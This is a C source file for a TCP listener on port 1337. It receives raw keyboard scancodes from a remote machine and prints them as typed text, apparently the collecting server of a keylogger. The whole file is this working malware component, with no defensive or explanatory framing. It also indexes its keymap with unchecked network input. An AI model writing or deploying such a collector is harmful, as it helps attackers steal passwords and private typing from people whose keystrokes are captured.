#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <string.h>
#include <strings.h>
#include <ctype.h>

#define SA   struct sockaddr
#define PORT 1337
#define MAX  1024

int main(int argc, char **argv) {

    /*
    if (getuid() != 0) {
        printf("[!] Please run as root!\n");
        return 1;
    }
    */

    int                 listenfd, connfd, n;
    struct sockaddr_in  servaddr;
    int                 recvKey[1], key;
    char *keyMap = "..1234567890-=..qwertyuiop[]..asdfghjkl;'..\\zxcvbnm,./.'";
    int caps = 0;

    if ( (listenfd = socket(AF_INET, SOCK_STREAM, 0)) < 0 ) {
        perror("[!] ListenFD");
        return 1;
    }

    bzero(&servaddr, sizeof(servaddr));
    servaddr.sin_family         = AF_INET;
    servaddr.sin_addr.s_addr    = htonl(INADDR_ANY);
    servaddr.sin_port           = htons(PORT);

    if ( (bind(listenfd, (SA *) &servaddr, sizeof(servaddr))) < 0 ){
        perror("[!] Bind");
        return 1;
    }

    if ( (listen(listenfd, 10)) < 0 ){
        perror("[!] Listen");
        return 1;
    }

    for ( ; ; ) {
	    memset(recvKey, 0, sizeof(recvKey));
        printf("[*] Waiting for connection on port %d\n", PORT);
        connfd = accept(listenfd, (SA *) NULL, NULL);

        while ( (n = recv(connfd, &recvKey, sizeof(recvKey), 0)) > 0 ) {
	        key = recvKey[0];

            switch (key) {
                case 57:
                    putchar('\x20');
                    break;
                case 28:
                    putchar('\x0A');
                    break;
                case 14:
                    putchar('\x08');
                    putchar('\x20');
                    putchar('\x08');
                    break;
                case 58:
                    if (!caps) {
                        caps++;
                    } else {
                        caps--;
                    }
                    break;
                default:
                    if (caps) {
                        putchar(toupper(keyMap[key]));
                    } else {
                        putchar(keyMap[key]);
                    }
            }
 
            fflush(stdout);
        }

        if ( n < 0 ) {
            perror("[!] Read");
            return 1;
        }

        close(connfd);
    }
}
